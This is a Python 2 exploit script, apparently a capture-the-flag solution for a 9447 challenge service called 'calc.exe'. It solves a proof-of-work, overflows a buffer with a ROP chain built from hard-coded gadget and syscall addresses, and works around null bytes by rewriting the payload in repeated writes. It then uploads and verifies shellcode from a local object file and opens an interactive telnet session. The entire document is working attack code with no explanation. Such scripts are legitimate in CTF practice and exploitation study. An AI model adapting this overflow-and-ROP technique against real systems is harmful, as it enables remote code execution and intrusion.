#!/usr/bin/python
import struct
import socket
import subprocess
import telnetlib

shellcode = open('double_fetch.o').read()

def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def p(v):
    return struct.pack('<I', v)

def u(v):
    return struct.unpack('<I', v)[0]

HOST = 'os-uedhyevi.9447.plumbing'
PORT = 9447

def make_conn(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    f = s.makefile('rw', bufsize=0)
    return s, f

_, proof_f = make_conn(HOST, PORT)
proof_prefix = proof_f.readline().split()[6]
proof = subprocess.check_output(['./proof', proof_prefix])
proof_f.write(proof)
port = int(proof_f.readline().strip().split()[-1])

print 'proof: ', proof_prefix, proof.strip()

s, f = make_conn(HOST, port)
readuntil(f, 'Welcome to calc.exe\n')

buf_addr = 0x7FFFFED0

sys_shmap = 0x001001FA
sys_read = 0x00100085
sys_write = 0x001000B8

pop3ret = 0x001000B4
pop_ebp_ret = 0x001000B6

shellcode_page = 0xb0002000

rop = ''
rop += p(sys_shmap)
rop += p(pop_ebp_ret)
rop += p(shellcode_page)

rop += p(sys_read)
rop += p(pop3ret)
rop += p(0)
rop += p(shellcode_page)
rop += p(len(shellcode))

rop += p(sys_write)
rop += p(shellcode_page)
rop += p(0)
rop += p(shellcode_page)
rop += p(len(shellcode))

assert len(rop) < 0x88 - 12

payload = ''
payload += 'A' * 12
payload += rop
payload = payload.ljust(0x88, 'A')
payload += p(buf_addr + 12 + 4)
assert '\n' not in payload

print payload.encode('hex')

zero_pos = []
for i, c in enumerate(payload):
    if c == '\0':
        zero_pos.insert(0, i)

cleaned_payload = payload.replace('\0', '.')
f.write(cleaned_payload + '\0')
print cleaned_payload.encode('hex')
f.readline()

for z in zero_pos:
    f.write(cleaned_payload[:z] + '\0')
    print cleaned_payload[:z].encode('hex')
    f.readline()

f.write('201527 0\0')
print f.readline().strip()
print f.readline().strip()

f.write(shellcode)
data = f.read(len(shellcode))

print 'verify'
print shellcode.encode('hex')
print data.encode('hex')
assert data == shellcode

while True:
    data = f.read(16)
    print data.encode('hex')

t = telnetlib.Telnet()
t.sock = s
t.interact()
